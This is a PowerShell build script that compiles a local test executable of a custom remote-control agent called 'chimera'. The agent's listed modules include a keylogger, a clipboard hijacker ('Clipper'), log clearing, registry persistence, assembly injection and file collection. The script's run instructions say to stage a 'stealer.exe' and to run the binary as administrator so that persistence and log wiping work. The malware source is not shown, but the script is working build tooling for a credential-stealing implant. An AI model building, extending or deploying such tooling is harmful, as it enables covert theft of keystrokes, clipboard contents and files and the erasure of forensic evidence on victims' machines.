# build_local_test.ps1
# Builds chimera_local_test.exe — runs all commands locally with console logging.
# Run from C:\projects\chimera-mythic-agent\local_test\
# Requires: .NET Framework csc.exe (comes with Windows — no Visual Studio needed)

$ErrorActionPreference = "Stop"

$csc = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
if (-not (Test-Path $csc)) {
    Write-Error "csc.exe not found at $csc"
    exit 1
}

$out   = "chimera_local_test.exe"
$agent = "..\agent_code"
$cmds  = "$agent\Commands"

$sources = @(
    "LocalTest.cs",
    "LocalConfig.cs",
    "$agent\Staging.cs",
    "$agent\StringHelper.cs",
    "$cmds\Shell.cs",
    "$cmds\Ls.cs",
    "$cmds\Pwd.cs",
    "$cmds\Ps.cs",
    "$cmds\Screenshot.cs",
    "$cmds\Persist.cs",
    "$cmds\ClearLogs.cs",
    "$cmds\InjectAssembly.cs",
    "$cmds\Upload.cs",
    "$cmds\Collect.cs",
    "$cmds\Clipper.cs",
    "$cmds\Keylogger.cs",
    "$cmds\Help.cs"
)

# Upload.cs references C2Http and Tasking — we need stub versions for local build
# They're included via LocalStubs.cs below (created automatically if missing)
$stubFile = "LocalStubs.cs"
if (-not (Test-Path $stubFile)) {
    @'
// Stubs for local test — C2Http and Tasking don't do anything locally
using System;
namespace Chimera {
    public static class C2Http {
        public static string Send(string json) { return "{}"; }
        public static void PostResponse(string uuid, string taskID, string output) { }
        public static string CheckIn() { return null; }
        public static string GetTasking(string uuid) { return null; }
        public static void Sleep() { System.Threading.Thread.Sleep(1000); }
    }
    public static class Tasking {
        public static string CallbackUUID = "local-test";
        public static string ExtractJsonValue(string json, string key) { return null; }
    }
}
'@ | Set-Content $stubFile -Encoding UTF8
    Write-Host "[+] Created LocalStubs.cs"
}
$sources += $stubFile

$args = @(
    "/target:exe",
    "/platform:x86",
    "/out:$out",
    "/r:System.Net.Http.dll",
    "/r:System.Drawing.dll",
    "/r:System.Management.dll",
    "/r:System.ServiceProcess.dll",
    "/r:System.Windows.Forms.dll"
) + $sources

Write-Host "[*] Compiling $out ..."
& $csc @args

if ($LASTEXITCODE -eq 0) {
    Write-Host ""
    Write-Host "[+] Build succeeded: $((Get-Item $out).FullName)"
    Write-Host ""
    Write-Host "Before running:"
    Write-Host "  1. Copy stealer.exe to C:\Users\Public\stealer.exe"
    Write-Host "  2. Run as admin (for ClearLogs, Persist registry write)"
    Write-Host "  3. .\chimera_local_test.exe"
    Write-Host ""
    Write-Host "Output log: C:\projects\chimera-local-test\chimera_test.log"
} else {
    Write-Error "Build failed (exit $LASTEXITCODE)"
}
